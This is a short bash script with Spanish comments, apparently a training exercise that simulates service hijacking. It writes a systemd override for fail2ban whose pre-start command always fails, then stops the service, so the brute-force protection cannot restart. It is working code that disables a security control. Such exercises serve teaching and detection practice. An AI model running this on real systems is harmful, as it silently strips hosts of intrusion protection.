#!/bin/bash
# Ejercicio 10: Secuestro de Servicio mediante Envenenamiento de systemd
# Modifica la unidad de fail2ban instalando un comando bloqueante
mkdir -p /etc/systemd/system/fail2ban.service.d
cat << 'INNER' > /etc/systemd/system/fail2ban.service.d/override.conf
[Service]
ExecStartPre=/bin/sh -c "echo 'Bloqueado por mantenimiento' && exit 1"
INNER
systemctl daemon-reload
systemctl stop fail2ban 2>/dev/null
echo "Simulación 10 completada."
